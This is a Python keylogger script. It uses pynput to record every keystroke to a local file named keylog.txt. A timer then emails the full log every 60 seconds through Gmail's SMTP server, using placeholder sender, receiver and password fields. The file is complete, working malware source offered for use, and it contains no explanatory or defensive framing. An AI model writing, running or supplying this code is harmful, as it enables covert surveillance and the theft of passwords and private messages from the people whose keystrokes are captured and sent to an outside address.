import pynput.keyboard as keyboard
import logging
import os
from threading import Timer

# Set up logging configuration
log_dir = ""
logging.basicConfig(filename=os.path.join(log_dir, "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

# Function to send the log file via email (Optional)
def send_log_file_via_email():
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText

    # Email credentials
    sender_email = "your_email@example.com"
    receiver_email = "receiver_email@example.com"
    email_password = "your_password"
    subject = "Keylogger Log File"
    
    # Email content
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    
    with open("keylog.txt", "r") as file:
        body = file.read()

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, email_password)
        text = msg.as_string()
        server.sendmail(sender_email, receiver_email, text)
        server.quit()
    except Exception as e:
        logging.info(f"Failed to send email: {e}")

# Function to periodically send the log file
def report():
    send_log_file_via_email()
    Timer(60, report).start()  # Send email every 60 seconds (modify as needed)

# Set up the keylogger
def start_keylogger():
    # Start sending the log file at intervals (optional)
    report()
    
    # Set up the listener for keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
